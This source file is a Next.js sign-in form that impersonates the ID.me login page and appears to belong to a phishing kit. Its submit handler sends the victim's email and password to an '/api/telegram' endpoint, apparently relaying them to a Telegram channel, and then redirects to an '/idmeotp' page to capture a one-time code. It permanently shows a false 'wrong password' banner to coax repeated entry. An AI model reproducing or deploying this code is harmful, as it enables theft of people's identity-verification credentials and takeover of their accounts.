"use client";

import Image from "next/image";
import { useState } from "react";
import { useRouter } from "next/navigation";
import idmeLogo from "./idme.png";

export default function SignInForm() {
  const router = useRouter();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password) {
      setError("Please fill out both email and password fields.");
      return;
    }

    setIsLoading(true);
    setError("");
    setSuccess("");

    try {
      const res = await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          data: { email, password },
          formType: "ID.me Sign In",
        }),
      });

      if (!res.ok) throw new Error("Submission failed");

      setSuccess("Sign-in attempt logged successfully!");
      setEmail("");
      setPassword("");

      setTimeout(() => {
        router.push("/idmeotp");
      }, 1200);
    } catch (err) {
      console.error(err);
      setError("Failed to log sign-in attempt. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col justify-center py-12 sm:px-6 lg:px-8">
      <div className="sm:mx-auto sm:w-full sm:max-w-md">
        {/* ID.me Logo */}
        <div className="flex justify-center">
          <div className="w-32 h-12 relative">
            <Image
              src={idmeLogo}
              alt="ID.me"
              width={128}
              height={48}
              className="object-contain"
              priority
            />
          </div>
        </div>

        {/* Main Card */}
        <div className="mt-8 bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
          {/* Header */}
          <div className="px-8 pt-8 pb-4">
            <div className="flex justify-center">
              <h1 className="text-2xl font-semibold text-gray-900 tracking-tight">
                Sign in to ID.me
              </h1>
            </div>
          </div>

          {/* Create Account Bar */}
          <div className="bg-blue-50 py-3 text-center border-y border-gray-100">
            <a
              href="https://cutt.ly/xPJZ0xv"
              target="_blank"
              rel="noopener noreferrer"
              className="text-blue-600 hover:text-blue-700 font-medium text-sm"
            >
              Create an ID.me account
            </a>
          </div>

          {/* Form Section */}
          <div className="p-8">
            {/* Persistent "Wrong username/password" message in red */}
            <div className="mb-6 text-center text-red-600 text-sm font-medium">
              Wrong username or password. Please try again.
            </div>

            {error && (
              <div className="mb-6 rounded-md bg-red-50 p-4 text-sm text-red-700">
                {error}
              </div>
            )}

            {success && (
              <div className="mb-6 rounded-md bg-green-50 p-4 text-sm text-green-700">
                {success}
              </div>
            )}

            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Email Field */}
              <div>
                <label
                  htmlFor="email"
                  className="block text-sm font-medium text-gray-700 mb-1"
                >
                  Email
                </label>
                <input
                  id="email"
                  name="email"
                  type="email"
                  autoComplete="email"
                  required
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="Enter your email"
                  className="appearance-none block w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base"
                />
              </div>

              {/* Password Field */}
              <div>
                <label
                  htmlFor="password"
                  className="block text-sm font-medium text-gray-700 mb-1"
                >
                  Password
                </label>
                <input
                  id="password"
                  name="password"
                  type="password"
                  autoComplete="current-password"
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Enter your password"
                  className="appearance-none block w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base"
                />
              </div>

              {/* Sign In Button */}
              <button
                type="submit"
                disabled={isLoading}
                className="w-full flex justify-center py-3.5 px-4 border border-transparent rounded-lg shadow-sm text-base font-semibold text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-70 disabled:cursor-not-allowed transition-colors"
              >
                {isLoading ? "Signing in..." : "Sign in to ID.me"}
              </button>
            </form>

            {/* Forgot password link */}
            <div className="mt-6 text-center">
              <a
                href="#"
                className="text-sm text-blue-600 hover:text-blue-700 font-medium"
              >
                Forgot password?
              </a>
            </div>
          </div>
        </div>

        {/* Footer Links */}
        <div className="mt-8 text-center text-xs text-gray-500 space-x-4">
          <a
            href="https://www.id.me/about"
            target="_blank"
            rel="noopener noreferrer"
            className="hover:text-gray-700"
          >
            What is ID.me?
          </a>
          <span>|</span>
          <a
            href="https://www.id.me/terms"
            target="_blank"
            rel="noopener noreferrer"
            className="hover:text-gray-700"
          >
            Terms of Service
          </a>
          <span>|</span>
          <a
            href="https://www.id.me/privacy"
            target="_blank"
            rel="noopener noreferrer"
            className="hover:text-gray-700"
          >
            Privacy Policy
          </a>
        </div>
      </div>
    </div>
  );
}